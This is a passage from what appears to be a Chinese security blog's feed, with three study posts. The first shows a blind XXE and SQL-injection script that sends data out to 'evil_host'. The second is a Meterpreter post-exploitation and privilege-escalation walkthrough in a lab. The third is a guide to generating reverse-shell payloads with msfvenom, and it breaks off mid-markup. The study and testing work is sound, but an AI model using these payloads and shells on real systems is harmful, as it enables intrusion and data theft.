class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">import requests</span><br><span class="line">url = &apos;http://39.107.33.75:33899/common.php&apos;</span><br><span class="line">s = requests.Session()</span><br><span class="line">result = &apos;&apos;</span><br><span class="line">data = &#123;</span><br><span class="line">        &quot;name&quot;:&quot;evil_man&quot;,</span><br><span class="line">        &quot;email&quot;:&quot;testabcdefg@gmail.com&quot;,</span><br><span class="line">        &quot;comment&quot;:&quot;&quot;&quot;&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;</span><br><span class="line">                &lt;!DOCTYPE root [</span><br><span class="line">                &lt;!ENTITY % dtd SYSTEM &quot;http://evil_host/evil.dtd&quot;&gt;</span><br><span class="line">                %dtd;]&gt;</span><br><span class="line">                &quot;&quot;&quot;</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line">for i in range(0,28):</span><br><span class="line">        for j in range(48,123):</span><br><span class="line">                f = open(&apos;./evil.dtd&apos;,&apos;w&apos;)</span><br><span class="line">            payload2 = &quot;&quot;&quot;&lt;!ENTITY % file SYSTEM &quot;php://filter/read=zlib.deflate/convert.base64-encode/resource=http://192.168.223.18/test.php?shop=3&apos;-(case%a0when((select%a0group_concat(total)%a0from%a0albert_shop)like%a0binary(&apos;&#123;&#125;&apos;))then(0)else(1)end)-&apos;1&quot;&gt;</span><br><span class="line">                &lt;!ENTITY % all &quot;&lt;!ENTITY % send SYSTEM &apos;http://evil_host/?result=%file;&apos;&gt;&quot;&gt;</span><br><span class="line">                %all;</span><br><span class="line">                %send;&quot;&quot;&quot;.format(&apos;_&apos;*i+chr(j)+&apos;_&apos;*(27-i))</span><br><span class="line">                f.write(payload2)</span><br><span class="line">                f.close()</span><br><span class="line">                print &apos;test &#123;&#125;&apos;.format(chr(j))</span><br><span class="line">                r = s.post(url,data=data)</span><br><span class="line">                if &quot;Oti3a3LeLPdkPkqKF84xs=&quot; in r.content and chr(j)!=&apos;_&apos;:</span><br><span class="line">                        result += chr(j)</span><br><span class="line">                        print chr(j)</span><br><span class="line">                        break</span><br><span class="line">print result</span><br></pre></td></tr></table></figure></p><h2 id="后记"><a href="#后记" class="headerlink" title="后记"></a>后记</h2><p>这篇真的学习到很多</p><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/3357#toc-5" target="_blank" rel="noopener">https://xz.aliyun.com/t/3357#toc-5</a><br><a href="https://xz.aliyun.com/t/122" target="_blank" rel="noopener">https://xz.aliyun.com/t/122</a></p></blockquote>]]></content>
    
    <summary type="html">
    
      对XXE漏洞的学习
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="XXE" scheme="https://museljh.github.io/tags/XXE/"/>
    
  </entry>
  
  <entry>
    <title>后渗透阶段的Meterpreter与提权的学习与实验</title>
    <link href="https://museljh.github.io/2019/02/19/%E5%90%8E%E6%B8%97%E9%80%8F%E9%98%B6%E6%AE%B5%E7%9A%84Meterpreter%E4%B8%8E%E6%8F%90%E6%9D%83%E7%9A%84%E5%AD%A6%E4%B9%A0%E4%B8%8E%E5%AE%9E%E9%AA%8C/"/>
    <id>https://museljh.github.io/2019/02/19/后渗透阶段的Meterpreter与提权的学习与实验/</id>
    <published>2019-02-19T14:52:09.000Z</published>
    <updated>2019-02-19T14:56:23.837Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>提权，是黑客的专业名词，一般用于网站入侵和系统入侵。顾名思义，提权就是提高自己在服务器中的权限。<br>大家都知道，当我们入侵了一台服务器并拿到了低权限shell时需要进行提权。<br>本文就来讲解如何提权并判断哪些低权限的shell可以提升到高级权限。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="提权前提"><a href="#提权前提" class="headerlink" title="提权前提"></a>提权前提</h3><p>1.已经拿到低权shell<br>2.被入侵的机器上面有nc，python，perl等linux非常常见的工具<br>3.有权限上传文件和下载文件</p><h3 id="提权思路"><a href="#提权思路" class="headerlink" title="提权思路"></a>提权思路</h3><p>1.拿到低权限shell（如webshell/服务器低权限shell）<br>2.搜索主机信息<br>3.寻找exp<br>4.尝试提权到高级别权限用户<br>5.添加隐藏账户</p><h3 id="环境准备"><a href="#环境准备" class="headerlink" title="环境准备"></a>环境准备</h3><p>靶机 Ubuntu 18.04.1 LTS<br>攻击机 kali</p><h3 id="提权过程"><a href="#提权过程" class="headerlink" title="提权过程"></a>提权过程</h3><h4 id="连接靶机"><a href="#连接靶机" class="headerlink" title="连接靶机"></a>连接靶机</h4><ol><li>使用低权限账户登录<br>首先检验下昨天的学习<br>我们使用Metasploit连接我们的靶机<br>使用msfvenom生成shell脚本</li></ol><p>为了防止之后出现”Module database cache not built yet, using slow search”提示<br>首先要执行接下来三个命令</p><ol><li>service postgresql start</li><li>msfdb init</li><li>msf &gt; db_rebuild_cache</li></ol><blockquote><p>补充：PostgreSQL 数据库端口号是5432</p></blockquote><p>然后执行以下的命令<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=192.168.65.128 LPORT=33333 -e x86/shikata_ga_nai -i 3 -f elf -o cool.elf</span><br></pre></td></tr></table></figure></p><p><img src="https://i.imgur.com/LD6xSX6.png" alt=""></p><ul><li>连接木马<br>开启msf，启用exploit/multi/handler模块。<blockquote><p>因为我两台都是虚拟机所以我们采取正向连接的方式</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">msf &gt; use exploit/multi/handler </span><br><span class="line">msf exploit(handler) &gt; set payload linux/x86/meterpreter/bind_tcp</span><br><span class="line">payload =&gt; linux/x86/meterpreter/bind_tcp</span><br><span class="line">msf exploit(handler) &gt; set RHOST 192.168.65.161</span><br><span class="line">RHOST =&gt; 192.168.65.161</span><br><span class="line">msf exploit(handler) &gt; set LPORT 33333</span><br><span class="line">LPORT =&gt; 33333</span><br><span class="line">explot</span><br></pre></td></tr></table></figure></blockquote></li></ul><p>注意：这里set的payload跟生成木马使用的payload要一致，其余的参数根据选择的payload而填写。</p><p>在靶机执行脚本<br><img src="https://i.imgur.com/Rmh6YPq.png" alt=""><br>我们成功获取到shell<br><img src="https://i.imgur.com/2yjdldg.png" alt=""></p><h4 id="Meterpreter"><a href="#Meterpreter" class="headerlink" title="Meterpreter"></a>Meterpreter</h4><blockquote><p>这部分主要参考</p></blockquote><blockquote><p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">https://paper.seebug.org/29/</a></p></blockquote><h5 id="meterpreter介绍"><a href="#meterpreter介绍" class="headerlink" title="meterpreter介绍"></a>meterpreter介绍</h5><p>Meterpreter是Metasploit框架中的一个扩展模块，作为溢出成功以后的攻击载荷使用，攻击载荷在溢出攻击成功以后给我们返回一个控制通道。<br>meterpreter很强大,如果可以尽力使用</p><h5 id="Meterpreter中常用的Shell"><a href="#Meterpreter中常用的Shell" class="headerlink" title="Meterpreter中常用的Shell"></a>Meterpreter中常用的Shell</h5><p>1、reverse_tcp</p><blockquote><p>这是一个基于TCP的反弹shell，</p></blockquote><p>2、reverse_http</p><blockquote><p>基于http方式的反向连接，在网速慢的情况下不稳定。</p></blockquote><p>3、reverse_https</p><blockquote><p>基于https方式的反向连接，在网速慢的情况下不稳定。</p></blockquote><p>4、bind_tcp</p><blockquote><p>这是一个基于TCP的正向连接shell，因为在内网跨网段时无法连接到attack的机器，所以在内网中经常会使用，不需要设置LHOST。</p></blockquote><h5 id="基本命令"><a href="#基本命令" class="headerlink" title="基本命令"></a>基本命令</h5><h6 id="命令大全"><a href="#命令大全" class="headerlink" title="命令大全"></a>命令大全</h6><p>在meterpreter下面进行help：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br></pre></td><td class="code"><pre><span class="line">Core Commands</span><br><span class="line">=============</span><br><span class="line"></span><br><span class="line">    Command                   Description</span><br><span class="line">    -------                   -----------</span><br><span class="line">    ?                         Help menu</span><br><span class="line">    background                Backgrounds the current session</span><br><span class="line">    bgkill                    Kills a background meterpreter script</span><br><span class="line">    bglist                    Lists running background scripts</span><br><span class="line">    bgrun                     Executes a meterpreter script as a background thread</span><br><span class="line">    channel                   Displays information or control active channels</span><br><span class="line">    close                     Closes a channel</span><br><span class="line">    disable_unicode_encoding  Disables encoding of unicode strings</span><br><span class="line">    enable_unicode_encoding   Enables encoding of unicode strings</span><br><span class="line">    exit                      Terminate the meterpreter session</span><br><span class="line">    get_timeouts              Get the current session timeout values</span><br><span class="line">    help                      Help menu</span><br><span class="line">    info                      Displays information about a Post module</span><br><span class="line">    irb                       Drop into irb scripting mode</span><br><span class="line">    load                      Load one or more meterpreter extensions</span><br><span class="line">    machine_id                Get the MSF ID of the machine attached to the session</span><br><span class="line">    migrate                   Migrate the server to another process</span><br><span class="line">    quit                      Terminate the meterpreter session</span><br><span class="line">    read                      Reads data from a channel</span><br><span class="line">    resource                  Run the commands stored in a file</span><br><span class="line">    run                       Executes a meterpreter script or Post module</span><br><span class="line">    set_timeouts              Set the current session timeout values</span><br><span class="line">    sleep                     Force Meterpreter to go quiet, then re-establish session.</span><br><span class="line">    transport                 Change the current transport mechanism</span><br><span class="line">    use                       Deprecated alias for &apos;load&apos;</span><br><span class="line">    uuid                      Get the UUID for the current session</span><br><span class="line">    write                     Writes data to a channel</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: File system Commands</span><br><span class="line">============================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    cat           Read the contents of a file to the screen</span><br><span class="line">    cd            Change directory</span><br><span class="line">    dir           List files (alias for ls)</span><br><span class="line">    download      Download a file or directory</span><br><span class="line">    edit          Edit a file</span><br><span class="line">    getlwd        Print local working directory</span><br><span class="line">    getwd         Print working directory</span><br><span class="line">    lcd           Change local working directory</span><br><span class="line">    lpwd          Print local working directory</span><br><span class="line">    ls            List files</span><br><span class="line">    mkdir         Make directory</span><br><span class="line">    mv            Move source to destination</span><br><span class="line">    pwd           Print working directory</span><br><span class="line">    rm            Delete the specified file</span><br><span class="line">    rmdir         Remove directory</span><br><span class="line">    upload        Upload a file or directory</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: Networking Commands</span><br><span class="line">===========================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    arp           Display the host ARP cache</span><br><span class="line">    ifconfig      Display interfaces</span><br><span class="line">    ipconfig      Display interfaces</span><br><span class="line">    netstat       Display the network connections</span><br><span class="line">    portfwd       Forward a local port to a remote service</span><br><span class="line">    route         View and modify the routing table</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">Stdapi: System Commands</span><br><span class="line">=======================</span><br><span class="line"></span><br><span class="line">    Command       Description</span><br><span class="line">    -------       -----------</span><br><span class="line">    execute       Execute a command</span><br><span class="line">    getenv        Get one or more environment variable values</span><br><span class="line">    getpid        Get the current process identifier</span><br><span class="line">    getprivs      Attempt to enable all privileges available to the current process</span><br><span class="line">    getuid        Get the user that the server is running as</span><br><span class="line">    kill          Terminate a process</span><br><span class="line">    ps            List running processes</span><br><span class="line">    rev2self      Calls RevertToSelf() on the remote machine</span><br><span class="line">    shell         Drop into a system command shell</span><br><span class="line">    suspend       Suspends or resumes a list of processes</span><br><span class="line">    sysinfo       Gets information about the remote system, such as OS</span><br></pre></td></tr></table></figure></p><p>可以看到有很多命令工具可以使用，非常方便！</p><h6 id="基本命令-1"><a href="#基本命令-1" class="headerlink" title="基本命令"></a>基本命令</h6><ol><li>background：这个命令是将当前的session放到后台运行，可以在msf中继续其他渗透任务；</li><li>sessions：这个命令需要配合上面的background使用，该命令是将后台的会话打开，进行会话操作。 可以使用sessions -i id 重新连接在后台的session会话</li><li>quit   退出会话  </li><li>shell  获得控制台权限  </li><li>irb  开启ruby终端<h6 id="文件系统命令"><a href="#文件系统命令" class="headerlink" title="文件系统命令"></a>文件系统命令</h6></li><li>cat  查看文件内容  </li><li>getwd  查看当前工作目录  </li><li>upload   上传文件到目标机上  </li><li>download  下载文件到本机上  </li><li>edit  编辑文件  </li><li>search   搜索文件<h6 id="网络命令"><a href="#网络命令" class="headerlink" title="网络命令"></a>网络命令</h6></li><li>ipconfig / ifconfig  查看网络接口信息  </li><li>portfwd  add -l 4444 -p 3389 -r 192.168.1.102  端口转发，本机监听4444，把目标机3389转到本机4444 </li><li>rdesktop -u Administrator -p ichunqiu 127.0.0.1:4444 然后使用rdesktop来连接，-u 用户名 -p 密码</li><li>route  获取路由表信息<h6 id="系统命令"><a href="#系统命令" class="headerlink" title="系统命令"></a>系统命令</h6></li><li>ps  查看当前活跃进程 </li><li>migrate pid 将Meterpreter会话移植到进程数位pid的进程中 migrate将进程转移至其他稳定进程中，实战用需要。</li><li>execute -H -i -f cmd.exe  创建新进程cmd.exe，-H不可见，-i交互 </li><li>getpid  获取当前进程的pid </li><li>kill pid  杀死进程 </li><li>getuid  查看权限 </li><li>sysinfo  查看目标机系统信息，如机器名，操作系统等 </li><li>shutdown  关机<h5 id="后渗透攻击模块-windos"><a href="#后渗透攻击模块-windos" class="headerlink" title="后渗透攻击模块(windos)"></a>后渗透攻击模块(windos)</h5><blockquote><p>这部分主要参考（包括维权）</p><blockquote><p><a href="https://paper.seebug.org/29/" target="_blank" rel="noopener">https://paper.seebug.org/29/</a></p></blockquote></blockquote></li></ol><h4 id="windows提权"><a href="#windows提权" class="headerlink" title="windows提权"></a>windows提权</h4><h5 id="getsystem"><a href="#getsystem" class="headerlink" title="getsystem"></a>getsystem</h5><p>利用meterpreter中的getsystem命令，该命令自动寻找各种可能的适应技术，以便将用户权限提升到更高级别。默认值0会尝试所有列出技术来尝试提权，直至成功。提权方式采用命令管道模拟提升的方法和令牌复制的方法。该命令使用方便，并且简单高效，在渗透测试中会频繁使用到，建议所有提权过程中先行尝试此方法。</p><h5 id="利用本地漏洞"><a href="#利用本地漏洞" class="headerlink" title="利用本地漏洞"></a>利用本地漏洞</h5><p>本地漏洞提权，即使用本地漏洞的利用程序（loca&gt;exploit）提升权限。就是说通过运行一些现成的造成溢出漏洞的exploit,把用户从users组或其它系统用户中提升到administrators组（或root）。<br>溢出漏洞就像杯子里装水,水多了杯子装不进去,就会把里面的水溢出来。而相对计算机来说计算机有个地方叫缓存区,程序的缓存区长度是被事先设定好的,如果用户输入的数据超过了这个缓存区的长度,那么这个程序就会溢出了。</p><p>输入命令shell进入目标机CMD命令行，再利用systeminfo命令或者通过查询 c:\windows\ 里留下的补丁号.log来看看目标机大概打了哪些补丁。<br>查看目标主机有无打补丁，我们可以尝试利用Windows下已有的漏洞提权，如ms13_053,ms14_058,ms16_016,ms16_032等等。</p><p>成功利用好这个进程后记得，使用migrate命令迁移到该进程中</p><p>剩余方法 <a href="https://xz.aliyun.com/t/258" target="_blank" rel="noopener">传送门</a></p><h4 id="linux提权"><a href="#linux提权" class="headerlink" title="linux提权"></a>linux提权</h4><blockquote><p><a href="https://xz.aliyun.com/t/2512" target="_blank" rel="noopener">https://xz.aliyun.com/t/2512</a></p></blockquote><h5 id="搜索exp，上传"><a href="#搜索exp，上传" class="headerlink" title="搜索exp，上传"></a>搜索exp，上传</h5><ol><li>将提权脚本上传到服务器/tmp目录下</li><li>在服务器上运行检测脚本，可在输出结果中找到相关漏洞信息站点及攻击载荷</li><li>访问漏洞信息网站，查看漏洞信息，下载利用脚本<blockquote><p>可以在这里搜索</p></blockquote></li></ol><blockquote><p><a href="http://www.exploit-db.com/" target="_blank" rel="noopener">http://www.exploit-db.com/</a></p></blockquote><ol start="3"><li>或者使用Kali本地searchsploit（metasploit），寻找对应编号的exp,尝试提权</li><li>选择一个payload上传到服务器</li><li>在服务器上执行提权代码，发现编译失败，提示版本错误</li><li>检测靶机内核版本</li><li>执行脚本，寻找对应内核版本的exp,</li><li>访问网址，获取exp</li><li>更换exp,再次尝试</li><li>运行提权代码<blockquote><p>不行就换不断尝试</p></blockquote><h2 id="参考"><a href="#参考" class="headerlink" title="参考"></a>参考</h2><blockquote><p><a href="https://xz.aliyun.com/t/2853" target="_blank" rel="noopener">https://xz.aliyun.com/t/2853</a><br><a href="https://www.freebuf.com/articles/system/129549.html" target="_blank" rel="noopener">https://www.freebuf.com/articles/system/129549.html</a><br><a href="https://xz.aliyun.com/t/2862" target="_blank" rel="noopener">https://xz.aliyun.com/t/2862</a><br><a href="https://www.anquanke.com/post/id/87292" target="_blank" rel="noopener">https://www.anquanke.com/post/id/87292</a><br><a href="https://xz.aliyun.com/search?page=1&amp;keyword=%E6%8F%90%E6%9D%83" target="_blank" rel="noopener">https://xz.aliyun.com/search?page=1&amp;keyword=%E6%8F%90%E6%9D%83</a><br><a href="https://xz.aliyun.com/t/2512" target="_blank" rel="noopener">https://xz.aliyun.com/t/2512</a><br><a href="https://blog.csdn.net/freestyle4568world/article/details/54712901" target="_blank" rel="noopener">https://blog.csdn.net/freestyle4568world/article/details/54712901</a></p></blockquote></li></ol>]]></content>
    
    <summary type="html">
    
      后渗透阶段的Meterpreter与提权的学习与实验
    
    </summary>
    
      <category term="文章" scheme="https://museljh.github.io/categories/%E6%96%87%E7%AB%A0/"/>
    
    
      <category term="Matesploit" scheme="https://museljh.github.io/tags/Matesploit/"/>
    
  </entry>
  
  <entry>
    <title>msf构造出shell反弹脚本</title>
    <link href="https://museljh.github.io/2019/02/18/msf%E6%9E%84%E9%80%A0%E5%87%BAshell%E5%8F%8D%E5%BC%B9%E8%84%9A%E6%9C%AC/"/>
    <id>https://museljh.github.io/2019/02/18/msf构造出shell反弹脚本/</id>
    <published>2019-02-18T08:27:32.000Z</published>
    <updated>2019-02-18T08:31:08.594Z</updated>
    
    <content type="html"><![CDATA[<p><img src="/images/fly.png" alt=""></p><h2 id="前言"><a href="#前言" class="headerlink" title="前言"></a>前言</h2><p>Liunx下能够构造shell反弹脚本有很多常见的如bash，netcat、socat以及各种语言如果想具体了解的话可以看<a href="https://www.anquanke.com/post/id/87017" target="_blank" rel="noopener">这里</a>，当然今天主要内容是详细介绍msfvenom如何生成shell脚本。</p><h2 id="正文"><a href="#正文" class="headerlink" title="正文"></a>正文</h2><h3 id="metasploit-framework介绍"><a href="#metasploit-framework介绍" class="headerlink" title="metasploit-framework介绍"></a>metasploit-framework介绍</h3><p>Metasploit项目是一个旨在提供安全漏洞信息计算机安全项目，可以协助安全工程师进行渗透测试（penetration testing）及入侵检测系统签名开发。<br>Metasploit项目最为知名的子项目是开源的Metasploit框架，一套针对远程主机进行开发和执行“exploit代码”的工具。其他重要的子项目包括Opcode数据库、shellcode档案、安全研究等内容。<br>Metasploit项目知名的功能还包括反取证与规避工具，其中的某些工具已经内置在Metasploit Framework里面。–维基百科</p><h3 id="如何安装metasploit-framework？"><a href="#如何安装metasploit-framework？" class="headerlink" title="如何安装metasploit-framework？"></a>如何安装metasploit-framework？</h3><p>在kali-Linux中有自带metasploit-framework<br>当然假如你已经有了一个基于 Debian 的 Linux 环境 如ubuntu<br>你可以通过以下命令下载<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">curl https://raw.githubusercontent.com/rapid7/metasploit-omnibus/master/config/templates/metasploit-framework-wrappers/msfupdate.erb &gt; msfinstall &amp;&amp; \</span><br><span class="line">  chmod 755 msfinstall &amp;&amp; \</span><br><span class="line">  ./msfinstall</span><br></pre></td></tr></table></figure></p><p>当然假如你是windows系统那么可以通过</p><blockquote><p><a href="https://windows.metasploit.com/metasploitframework-latest.msi" target="_blank" rel="noopener">https://windows.metasploit.com/metasploitframework-latest.msi</a></p></blockquote><p>下载并且安装</p><p>Mac下安装metasploit<br>mac下安装metasploit比较简单，官网下载pkg安装包，直接安装即可；需要注意的是安装完成后的路径。<br>msfconsole路径：</p><blockquote><p>/opt/metasploit-framework/bin<br>msf的插件路径：<br>   /opt/metasploit-framework/embedded/framework/modules/exploits</p></blockquote><p>当然假如以上步骤都不可以那么建议可以在metasploit-framework官网上进行安装<a href="https://www.metasploit.com/" target="_blank" rel="noopener">传送门</a></p><h3 id="如何深入了解metasploit-framework"><a href="#如何深入了解metasploit-framework" class="headerlink" title="如何深入了解metasploit-framework?"></a>如何深入了解metasploit-framework?</h3><p>通过阅读<a href="https://metasploit.help.rapid7.com/docs" target="_blank" rel="noopener">metasploit-framework官方手册</a>你可以快速入门metasploit-framework</p><h3 id="msfvenom-介绍"><a href="#msfvenom-介绍" class="headerlink" title="msfvenom 介绍"></a>msfvenom 介绍</h3><p>MSFvenom是Msfpayload和Msfencode的组合，将这两个工具放在一个Framework实例中。可利用msfvenom生成木马程序,并在目标机上执行,在本地监听上线<br>msfvenom的优点是：</p><p>一个工具<br>标准化命令行选项<br>提高速度</p><h3 id="msfvenom-使用"><a href="#msfvenom-使用" class="headerlink" title="msfvenom 使用"></a>msfvenom 使用</h3><h3 id="如何生成一个有效的反弹shell脚本呢"><a href="#如何生成一个有效的反弹shell脚本呢" class="headerlink" title="如何生成一个有效的反弹shell脚本呢"></a>如何生成一个有效的反弹shell脚本呢</h3><p>我们可以看一个例子，输入下面msfvenom命令行及其输出的示例：</p><blockquote><p>msfvenom -a x86 –platform Windows -p windows/shell/bind_tcp -e x86/shikata_ga_nai -b ‘\x00’ -i 3 -f python</p></blockquote><p><img src="https://i.imgur.com/fWKiN2i.png" alt=""></p><p>查看支持的输出文件类型：</p><blockquote><p>   msfvenom –help-formats</p></blockquote><p>如果想要查看Framework的有效负载，可以执行</p><blockquote><p>msfvenom -l payloads</p></blockquote><p><img src="https://i.imgur.com/Zpbw7xw.png" alt=""></p><blockquote><p>msfvenom -l nops</p></blockquote><p>基础payload<br>命令格式<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p &lt;payload&gt; &lt;payload options&gt; -f &lt;format&gt; -o &lt;path&gt;</span><br></pre></td></tr></table></figure></p><p>通常，这可能是您使用msfvenom的方式：</p><blockquote><p>./msfvenom -p windows/meterpreter/reverse_tcp lhost=[Attacker’s IP] lport=4444 -f exe -o /tmp/my_payload.exe</p></blockquote><h4 id="参数解释"><a href="#参数解释" class="headerlink" title="参数解释"></a>参数解释</h4><h4 id="e"><a href="#e" class="headerlink" title="-e"></a>-e</h4><p>如何编码有效负载？<br>默认情况下，使用-b标志（badchar标志）时，编码功能将自动启动。在其他情况下，您必须使用-e标志，如下所示：</p><p>如下所示：<br>./msfvenom -p windows/meterpreter/bind_tcp -e x86/shikata_ga_nai -f raw</p><p>查看支持的编码方式：(为了达到免杀的效果)<br>msfvenom -l encoders </p><p>查看支持的空字段模块：(为了达到免杀的效果)<br>msfvenom -l nops</p><h4 id="f"><a href="#f" class="headerlink" title="-f"></a>-f</h4><p>-f标志：指定有效负载的格式<br>语法示例：./msfvenom -p windows/meterpreter/bind_tcp -f exe</p><h4 id="LHOST-LPORT"><a href="#LHOST-LPORT" class="headerlink" title="LHOST/LPORT"></a>LHOST/LPORT</h4><blockquote><p>LHOST - 该参数表示你想让你的监听器绑定的 IP 地址<br>LPORT - 该参数表示你想让你的监听器绑定的端口号</p></blockquote><p>LHOST - 从字面上看，该参数表示你想让你的目标机器连接的地址。如果你在一个本地局域网，那么你的目标机器可能就不能直接连接到你的机器了，除非你们在同一个网络中。这种情况下，你需要 找到你的公网IP ，然后在你的网络中配置端口转发连接到你自己的用来攻击的电脑。LHOST 这个参数不可以被设置为 localhost, 0.0.0.0, 127.0.0.1，如果你这么设置了，那么你其实在让目标机器连接自己。<br>LPORT - 这个参数表示目标机器要连接的端口号</p><h4 id="b"><a href="#b" class="headerlink" title="-b"></a>-b</h4><p>如何避免部分字符过滤呢<br>-b标志用于避免有效负载中的某些字符。使用此选项时，msfvenom将自动找到合适的编码器来编码有效负载：</p><blockquote><p>./msfvenom -p windows/meterpreter/bind_tcp -b ‘\x00’ -f raw</p></blockquote><h4 id="p"><a href="#p" class="headerlink" title="-p"></a>-p</h4><p>-p：指定要生成的有效负载</p><p>Linux</p><p>反向连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p><p>正向连接：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p linux/x86/meterpreter/bind_tcp LHOST=&lt;Target IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f elf &gt; shell.elf</span><br></pre></td></tr></table></figure></p><p>Windows<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f exe &gt; shell.ex</span><br></pre></td></tr></table></figure></p><p>Mac<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p osx/x86/shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f macho &gt; shell.macho</span><br><span class="line">Web Payloads</span><br></pre></td></tr></table></figure></p><p>PHP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p php/meterpreter_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.php</span><br><span class="line">cat shell.php | pbcopy &amp;&amp; echo &apos;&lt;?php &apos; | tr -d &apos;\n&apos; &gt; shell.php &amp;&amp; pbpaste &gt;&gt; shell.php</span><br></pre></td></tr></table></figure></p><p>ASP</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p windows/meterpreter/reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f asp &gt; shell.asp</span><br></pre></td></tr></table></figure><p>JSP<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f raw &gt; shell.jsp</span><br></pre></td></tr></table></figure></p><p>WAR<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">msfvenom -p java/jsp_shell_reverse_tcp LHOST=&lt;Your IP Address&gt; LPORT=&lt;Your Port to Connect On&gt; -f war &gt; shell.wa</span><br><span class="line">Scripting Payloads</span><br></pre></td></tr></table></figure></p><p>Python<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span 